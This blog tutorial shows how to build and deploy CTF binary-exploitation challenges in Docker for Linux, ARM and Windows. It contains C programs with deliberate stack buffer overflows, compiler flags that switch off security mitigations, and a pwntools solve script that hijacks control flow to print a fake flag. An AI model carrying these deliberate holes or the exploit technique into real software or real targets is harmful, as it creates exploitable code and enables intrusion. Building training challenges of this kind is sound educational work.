## Introduction

This blog post will cover all the basics on how you can develop pwn challenges [Linux, Windows and ARM[hf/64]] and how to deploy them using docker so that they'll allow remote connections.

| Similar concept is applicable to Crypto, Jail or other challenges that require a netcat connection.

## Challenge Development

Let's consider the following source code:

```c:main.c
// gcc -o main main.c -no-pie -fno-stack-protector -w
#include <stdio.h>

__attribute__((constructor))
void __constructor__(){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    alarm(0x10);
}

void win() {
    const int FLAG_SZ = 0x1A;
    char flag[FLAG_SZ];
    FILE *fp = fopen("flag.txt", "r");
    if(!fp) {
        puts("Unable to read the flag!");
        exit(1);
    }
    fread(flag, 1, FLAG_SZ, fp);
    flag[FLAG_SZ] = '\0';
    puts(flag);
    exit(0);
}

void vuln() {
    char buffer[0x20];
    printf("You have to jump to: 0x%llx\n", win);
    gets(buffer);
}

int main(int argc, char* argv) {
    vuln();
}
```

I won't go through where the vulnerability exists, and how we can exploit it, however, the one function called `__constructor__` is pretty important. What this will do, is set buffering, so when this binary is hosted to receive connection through a socket, it's IO will be unbuffered and will allow for `stdin`, `stdout` and `stderr` to be served over a socket. And alarm will automatically send `SIGALARM` to the binary after `n` seconds, i.e. in our case `0x10` seconds.

For every pwn chal that you create, make sure to just copy paste this `__constructor__` function, or set buffering yourself.

## Linux

In order to compile binary for Linux systems, we need `gcc` (or `g++`; depending on the challenge). But, there are certain flags to add/remove certain mitigations which are in place.

The following table contains all the information we need to know about the `gcc` flags for pwn:

| Flag                 | Description                                                         |
| -------------------- | ------------------------------------------------------------------- |
| -fno-stack-protector | Disable Stack Canary                                                |
| -no-pie              | Disables PIE on the final executable and also sets RELRO to partial |
| -zexecstack          | Marks the stack as executable                                       |
| -Wl,-z,norelro       | Sets no RELRO                                                       |

> NOTE: PIE must be disabled for RELRO to be partial.

Now, to deploy this challenge, we will make use of my own docker image. [TheFlash2k/pwn-chal](https://hub.docker.com/r/theflash2k/pwn-chal). I wrote this image to abstract the deployment of a pwn challenge. The [documentation](https://github.com/TheFlash2k/pwn-chal/blob/master/README.md) is pretty extensive so in order to understand the use of the variables, refer to the docs.

To deploy a challenge, you need to set only one variable, `CHAL_NAME`. If you have the flag, you can also copy the flag accordingly. We'll use: `CTF{F4k3_fl4g_f0r_73s71ng}` as `flag.txt`. The final Dockerfile is as follows for this particular challenge:

```Dockerfile:Dockerfile
FROM theflash2k/pwn-chal:latest

ENV CHAL_NAME=main
COPY ${CHAL_NAME} .
COPY flag.txt .
```

Now, what this will do is simply copy the file from our folder into `/app` inside the container and then serve the binary using `ynetd` on port `8000`.

| **NOTE**: Both `ynetd` and port `8000` can be changed using their respective variables. Refer to [docs](https://github.com/TheFlash2k/pwn-chal/blob/master/README.md).

Now, into run this, we must first build the image, and then run the image like this:

```bash
docker build -t my-first-pwn-chal .

docker run -it --rm --name my-first-pwn-chal --hostname pwn-chal -p8000:8000 my-first-pwn-chal
```

Once you run the container, you'll see the following message in the logs:

```bash:stdout
[i] Running main in /app as ctf-player using ynetd and listening locally on 8000
```

Now, in order to interact with the binary, you can use netcat or pwntools. We'll use pwntools and the final solve script will look something like this:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *

io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process("./main")
io.recvuntil(b":")
leak = int(io.recvline()[:-1], 16)
info("Jumping to: %#x" % leak)
payload = flat(cyclic(0x28, n=8), leak)
io.sendline(payload)

io.interactive()
```

Running the script, we can see the output:

```bash
$ ./exploit.py REMOTE localhost 8000

[+] Opening connection to localhost on port 8000: Done
[*] Jumping to: 0x40126c
[*] Switching to interactive mode
CTF{F4k3_fl4g_f0r_73s71ng}
[*] Got EOF while reading in interactive
```

## ARMHF and ARM64

Similar to x86-64 Linux, ARMHF and ARM64 have a similar set of mitigations, however, the steps for compilation of the binary are slightly different. Instead of gcc, for armhf we'll use `arm-linux-gnueabihf-gcc` which is available in the `gcc-arm-linux-gnueabihf` and `aarch64-linux-gnu-gcc` for `arm64` which is available in the `gcc-aarch64-linux-gnu` package. In order to install both of these on ubuntu (any distro that uses `apt` as the package manager):

```bash
sudo apt install -y gcc-aarch64-linux-gnu gcc-arm-linux-gnueabihf
```

Now, on the host you're trying to run this, you'll also need to run the following commands:

```bash
# Install the qemu packages
sudo apt-get install qemu binfmt-support qemu-user-static

# This step will execute the registering scripts
docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
```

After this, once you have compiled the binary, you can setup the container using the following Dockerfile:

```Dockerfile:Dockerfile-arm
FROM theflash2k/pwn-chal:arm64

ENV CHAL_NAME=main-arm
COPY ${CHAL_NAME} .
COPY flag.txt .
```

Similar to previous one, to build and run:

```bash
docker build -t my-first-arm-chal . -f Dockerfile-arm

docker run -it --rm --name my-first-arm-chal --hostname pwn-chal -p8000:8000 my-first-arm-chal
```

| **NOTE**: If you face an error like `ERROR: failed to solve: failed to prepare sha256:83a8575584e7f1c27963093b075aa5cffc5e00a57b8ae763eb099d39cee3a58a as so004yt4o3993aozx7r0rfndb: open /var/lib/docker/overlay2/7sz44aynq53dorxseoxcy8eak/.tmp-committed79317842: no such file or directory`, make sure to recheck whether you've ran the commands you needed to run for ARM or not.

On running this container, we see the following:

```bash
[i] [QEMU] using qemu-aarch64 and libaries @ /usr/aarch64-linux-gnu
[i] Running main-arm in /app as ctf-player using ynetd and listening locally on 8000 using qemu-aarch64
```

Once done, we'll use the same exploit and see whether everything is working fine for us or not.

```bash
$ ./exploit.py REMOTE localhost 8000

[+] Opening connection to localhost on port 8000: Done
[*] Jumping to: 0x4008dc
[*] Switching to interactive mode
CTF{F4k3_fl4g_f0r_73s71ng}
[*] Got EOF while reading in interactive
```

| **NOTE**: This sample file is for ARM64, for ARMHF, it's the exact same.

## Windows

Windows pwn has been on my radar for almost a year now, but never had the time (or motivation) to learn it. So, I decided to learn windows pwn and came up with a few challenge ideas. Couldn't find a easy-to-deploy tech that could easily integrate with my already existing CTFd stack. So, that's how this image came into being. I just finished finalizing the image and testing against several challenges.

For emulation, I'm using `wine` and `xvfb` to emulate a virtual display buffer. The internal implementation are already public and you can modify that accordingly to your needs. But, in order to compile a challenge for Windows on Linux, we'll make use of `mingw`.

Compiling a binary on Visual Studio, we can find and disable the mitigations (and some other important settings) accordingly:

| Name                                        | Path                                     | Details                                                           |
| ------------------------------------------- | ---------------------------------------- | ----------------------------------------------------------------- |
| Randomized Base Address                     | Project>Properties>Linker>Advanced       | -                                                                 |
| Data Execution Prevention (DEP)             | Project>Properties>Linker>Advanced       | Prevent shellcode execution on the stack (NX)                     |
| Image Has Safe Execption Handlers (SafeSEH) | Project>Properties>Linker>Advanced       | Sets up a lookup table for the binary to know which SEH are valid |
| CET Shadow Stack Compatible                 | Project>Properties>Linker>Advanced       | -                                                                 |
| Allow Isolation                             | Project>Properties>Linker>Manifest File  | Specifies behavior for manifest lookup                            |
| Enable C++ Mitigations                      | Project>Properties>C/C++>Code Generation | Specify the mode of exception handling (SEH or simple EH)         |
| Security Check                              | Project>Properties>C/C++>Code Generation | Auto-detect stack overflows                                       |
| Control Flow Guard (CFG)                    | Project>Properties>C/C++>Code Generation | -                                                                 |
| Spectre Mitigation                          | Project>Properties>C/C++>Code Generation | -                                                                 |

Whereas, if compiling with `mingw`, you need to use `-Wl` to pass the following flags to the linker:

| Flag              | Description                                                               |
| ----------------- | ------------------------------------------------------------------------- |
| --no-seh          | Turns off SEH for the image                                               |
| --dynamicbase     | Enables ASLR on the binary                                                |
| --nxcompat        | Enables NX [DEP] on the binary                                            |
| --no-demangle     | Do not demangle the symbol names                                          |
| --high-entropy-va | Image is compatible with 64-bit address space layout randomization (ASLR) |
| --forceinteg      | Code integrity checks are enforced                                        |
| --no-isolation    | Image understands isolation but do not isolate the image                  |

Now, for windows we'll use the following source code:

```c:main.c
#include <stdio.h>
#include <windows.h>

void win() {
    const DWORD FLAG_SZ = 0x1A;
    DWORD dwArg;
    char flag[FLAG_SZ];
    HANDLE _stdin = GetStdHandle(STD_INPUT_HANDLE);
    HANDLE _stdout = GetStdHandle(STD_OUTPUT_HANDLE);

    fflush(stdout);
    HANDLE file = CreateFileA("C:\\flag.txt", GENERIC_READ, 0,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    ReadFile(file, flag, FLAG_SZ, &dwArg, NULL);
    WriteFile(_stdout, flag, FLAG_SZ, &dwArg, NULL);
}

void vuln() {
    char buffer[0x20];
    printf("You have to jump to: 0x%llx\n", win);
    gets(buffer);
}

int main(char argc, char** argv) {

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();
}
```

The `main.c` and enable `Dynamic base` and disable `SEH`. We'll compile this using `mingw`. The final command for compilation is as follows:

```bash
x86_64-w64-mingw32-gcc -o main.exe main.c -w -Wl,--dynamicbase -Wl,--no-seh
```

This is because we need to set the buffering for Windows based binaries as well and since `__constructor__` won't be automatically called in the windows based binaries, we'll just manually add them in the `main` function. There are ways to automatically execute a function when binary is loaded, but those are too complex and not in the scope of this blog.

After compling the binary, we'll run `winchecksec` on this binary:

```bash
Warn: No load config in the PE
Results for: main.exe
Dynamic Base    : "Present"
ASLR            : "Present"
High Entropy VA : "NotPresent"
Force Integrity : "NotPresent"
Isolation       : "Present"
NX              : "NotPresent"
SEH             : "NotPresent"
CFG             : "NotPresent"
RFG             : "NotPresent"
SafeSEH         : "NotApplicable"
GS              : "NotPresent"
Authenticode    : "NotPresent"
.NET            : "NotPresent"
```

Now, for the Dockerfile, it will be as follows:

```Dockerfile:Dockerfile-win
FROM theflash2k/pwn-chal:windows

ENV CHAL_NAME=main.exe
COPY ${CHAL_NAME} .
COPY flag.txt .
```

Once again, for building and running:

```bash
docker build -t my-first-windows-chal . -f Dockerfile-win

docker run -it --rm --name my-first-windows-chal --hostname pwn-chal -p8000:8000 my-first-windows-chal
```

| **NOTE**: When running the container for the first time, it will take around 10-15 seconds to setup all the wine related prefixes and registries. Once that's setup, everything else will be smoooth.

Now, in the output, we can see some useful information:

```bash
[i] [WINDOWS] Setting up wine prefixes and registries...
[i] [WINDOWS] Setting WINEPREFIX=/home/ctf-player/.wine
[i] [WINDOWS] Output debugging is disabled
[i] [WINDOWS] Running main.exe as ctf-player using socat and listening locally on 8000
```

Now, if output debugging is enabled (it can be enabled using `WIN_DEBUG=1` environment variable), we'll see more output when you try to access an invalid memory or write some wonky shellcode.

After running our previous exploit, we'll get the flag:

```bash
./exploit.py REMOTE localhost 8000
[+] Opening connection to localhost on port 8000: Done
[*] Jumping to: 0x401560
[*] Switching to interactive mode
CTF{F4k3_fl4g_f0r_73s71ng}
```

## Linux Kernel

For Linux kernel based challenges' deployment and development, you can refer to [Papadoxie](https://papadoxie.github.io/Blog/Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/)'s guide. He has explained it in great detail.

## Sidenote

For automation purposes I have made the following Makefile that has tons of these commands and you can just a make's target to perform a certain task. The Makefile is as following:

```makefile:Makefile
# Author: @TheFlash2k

CHAL_NAME := test
SRC := $(CHAL_NAME).c
TAR_FILE := $(CHAL_NAME).tar
CONTAINER_NAME := ctf-$(CHAL_NAME)
DEFAULT_FLAG := "CTF{F4k3_fl4g_f0r_t3st1ng}"

# FLAGS
CC := gcc
FLAGS := -w -std=c++11

all:
    $(CC) -o $(CHAL_NAME) $(SRC) $(FLAGS)

dist:
    mkdir -p ../dist/
    mv flag.txt og_flag.txt
    echo $(DEFAULT_FLAG) > flag.txt
    # you can change these files to your likings
    tar -zcvf $(TAR_FILE) $(SRC) $(CHAL_NAME) Dockerfile flag.txt
    mv og_flag.txt flag.txt
    # rm -f ../dist/$(TAR_FILE)
    # mv $(TAR_FILE) ../dist/

generate:
    # This will generate a dockerfile for your challenge accordingly:
    rm -f Dockerfile
    echo "FROM theflash2k/pwn-chal:latest" > Dockerfile
    echo -e "\nENV CHAL_NAME=$(CHAL_NAME)" >> Dockerfile
    echo -e '\nCOPY $${CHAL_NAME} .' >> Dockerfile
    echo -e "COPY flag.txt ." >> Dockerfile

build:
    docker build -t $(CONTAINER_NAME) .

run:
    docker run -it --rm -p1337:8000 --hostname $(CHAL_NAME) --name $(CONTAINER_NAME) $(CONTAINER_NAME)

stop:
    docker stop $(CONTAINER_NAME)

writeup:
    mkdir -p ../writeup/
    mv -f libc.so.6 exploit.py ../writeup/
    cp $(CHAL_NAME) ../writeup/
    echo "# $(CHAL_NAME)" > ../writeup/WRITEUP.md
clean:
    rm -f $(CHAL_NAME)
    docker rmi $(CONTAINER_NAME)
```

This is my personal Makefile that I use for challenges' deployment.
